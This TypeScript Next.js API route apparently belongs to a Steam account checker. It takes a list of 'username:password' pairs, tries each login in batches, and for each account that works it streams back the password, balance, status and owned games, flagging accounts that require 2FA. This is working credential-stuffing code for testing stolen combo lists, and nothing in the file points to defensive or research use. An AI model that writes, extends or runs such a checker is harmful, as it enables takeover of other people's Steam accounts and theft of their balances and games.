import { NextResponse } from 'next/server';
import { SteamAPI } from '../../../utils/steam/steamApi';

const BATCH_SIZE = 3; // Tamaño del lote para procesar simultáneamente

async function checkAccount(account: string) {
  const [username, password] = account.split(':');
  
  if (!username || !password) {
    return {
      account,
      success: false,
      error: 'Formato inválido'
    };
  }

  const api = new SteamAPI();
  const loginResult = await api.login(username, password);

  if (loginResult.success) {
    const accountInfo = await api.getAccountInfo();
    console.log('📊 Información de cuenta obtenida:', {
      status: accountInfo.data?.status,
      balance: accountInfo.data?.balance,
      games: accountInfo.data?.games
    });

    return {
      account: username,
      success: true,
      details: {
        username,
        password,
        status: accountInfo.data?.status || 'No disponible',
        balance: accountInfo.data?.balance || 'No disponible',
        games: accountInfo.data?.games || { total: 0, list: [] }
      }
    };
  } else if (loginResult.error?.code === '2FA_REQUIRED') {
    return {
      account: username,
      success: true,
      details: {
        username,
        password,
        status: '2FA_REQUIRED',
        balance: 'N/A',
        games: { total: 0, list: [] }
      }
    };
  } else {
    console.log('❌ Error en login:', loginResult.error);
    return {
      account: username,
      success: false,
      error: loginResult.error?.message
    };
  }
}

export async function POST(req: Request) {
  try {
    const { accounts } = await req.json();
    
    if (!Array.isArray(accounts)) {
      return NextResponse.json(
        { error: 'El formato de las cuentas es inválido' },
        { status: 400 }
      );
    }

    const results = [];
    const encoder = new TextEncoder();
    const stream = new TransformStream();
    const writer = stream.writable.getWriter();

    const processAccounts = async () => {
      for (let i = 0; i < accounts.length; i += BATCH_SIZE) {
        const batch = accounts.slice(i, i + BATCH_SIZE);
        const batchResults = await Promise.all(batch.map(checkAccount));
        
        for (const result of batchResults) {
          results.push(result);
          await writer.write(
            encoder.encode(`data: ${JSON.stringify({ result })}\n\n`)
          );
        }
      }
      await writer.close();
    };

    processAccounts();

    return new Response(stream.readable, {
      headers: {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive'
      }
    });
  } catch (error) {
    console.error('Error al verificar cuentas:', error);
    return NextResponse.json(
      { error: 'Error interno del servidor' },
      { status: 500 }
    );
  }
} 